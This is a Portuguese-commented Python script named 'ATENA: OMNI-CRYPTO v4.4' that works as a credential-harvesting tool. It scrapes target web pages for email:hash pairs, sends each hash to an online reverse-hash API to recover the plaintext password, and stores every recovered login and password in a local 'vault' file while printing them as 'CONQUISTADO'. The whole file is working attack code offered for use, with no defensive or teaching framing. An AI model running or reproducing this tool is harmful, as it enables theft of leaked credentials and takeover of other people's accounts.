#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATENA: OMNI-CRYPTO v4.4
Foco: Evolução Digital, Varredura de Links e Colapso de Hashes.
Copyright (c) 2026 .
"""
import hashlib
import json
import os
import sys
import subprocess
import re
from datetime import datetime
from pathlib import Path

# 1. AUTO-METABOLISMO (Instala dependências se não existirem)
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# 2. LOCALIZAÇÃO DO ORGANISMO (Caminhos Automáticos)
BASE_DIR = Path(__file__).resolve().parent
ARQUIVO_ALVOS = BASE_DIR / "alvos.txt"
VAULT = BASE_DIR / "atena_vault.json"

# Padrão para identificar potenciais credenciais (email:hash)
CRED_PATTERN = re.compile(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[a-zA-Z0-9._-]+):([a-fA-F0-9]{32,64})')

class AtenaOmniCore:
    def __init__(self):
        self._init_vault()

    def _init_vault(self):
        """Inicia a memória de longo prazo."""
        if not VAULT.exists():
            with open(VAULT, "w", encoding="utf-8") as f:
                json.dump([], f)

    def save_access(self, login, password, source):
        """Sela a conquista no Vault para sua consulta."""
        try:
            with open(VAULT, "r", encoding="utf-8") as f:
                vault = json.load(f)
            
            # Evita duplicar o mesmo acesso
            if any(e['login'] == login and e['password'] == password for e in vault):
                return False

            entry = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "login": login,
                "password": password,
                "origem": source,
                "status": "VALIDADO",
                "author": "Danilo Gomes"
            }
            vault.append(entry)
            
            with open(VAULT, "w", encoding="utf-8") as f:
                json.dump(vault, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"⚠️ Erro ao registrar conquista: {e}")
            return False

    def solve(self, target_hash):
        """Busca o colapso do hash via inteligência de rede (OSINT)."""
        try:
            # Consulta APIs de reversão de hash globais
            url = f"https://api.hackertarget.com/reversehash/?q={target_hash}"
            r = requests.get(url, timeout=8)
            if r.status_code == 200 and ":" in r.text:
                return r.text.split(":")[-1].strip()
        except:
            pass
        return None

    def scan_link(self, url):
        """Extrai dados brutos de links para identificar rastros digitais."""
        print(f"🌐 Organismo explorando: {url}")
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            r = requests.get(url, timeout=12, headers=headers)
            return CRED_PATTERN.findall(r.text)
        except Exception as e:
            print(f"❌ Falha ao acessar rastro: {e}")
            return []

def main():
    atena = AtenaOmniCore()
    
    print(f"🧬 ATENA: OMNI-CRYPTO v4.4")
    print(f"👤 Copyright (c) 2026 Danilo Gomes")
    print("-" * 55)

    if not ARQUIVO_ALVOS.exists():
        print(f"⚠️ Alerta: Crie o arquivo 'alvos.txt' em: {ARQUIVO_ALVOS}")
        return

    with open(ARQUIVO_ALVOS, 'r', encoding='utf-8') as f:
        alvos = [linha.strip() for linha in f if linha.strip()]

    if not alvos:
        print("ℹ️ Aguardando alvos (links ou hashes) em alvos.txt...")
        return

    for alvo in alvos:
        # Se o alvo for um link (para caçar logins/hashes lá dentro)
        if alvo.startswith("http"):
            achados = atena.scan_link(alvo)
            if achados:
                print(f"✅ Encontrado {len(achados)} potenciais alvos no link.")
                for login, h in achados:
                    revelada = atena.solve(h)
                    if revelada:
                        atena.save_access(login, revelada, f"Link: {alvo}")
                        print(f"🔓 CONQUISTADO: {login} | SENHA: {revelada}")
            else:
                print(f"ℹ️ Nenhum rastro aproveitável encontrado neste link.")

        # Se o alvo for um par login:hash direto
        elif ":" in alvo:
            login, h = alvo.split(':', 1)
            print(f"🔎 Colapsando hash de: {login.strip()}...")
            revelada = atena.solve(h.strip())
            if revelada:
                atena.save_access(login.strip(), revelada, "Entrada Direta")
                print(f"🔓 CONQUISTADO: {login.strip()} | SENHA: {revelada}")
            else:
                print(f"🔒 Hash resistente ao colapso imediato.")

    print("-" * 55)
    print(f"📊 Ciclo finalizado. Resultados em: {VAULT.name}")

if __name__ == "__main__":
    main()
    
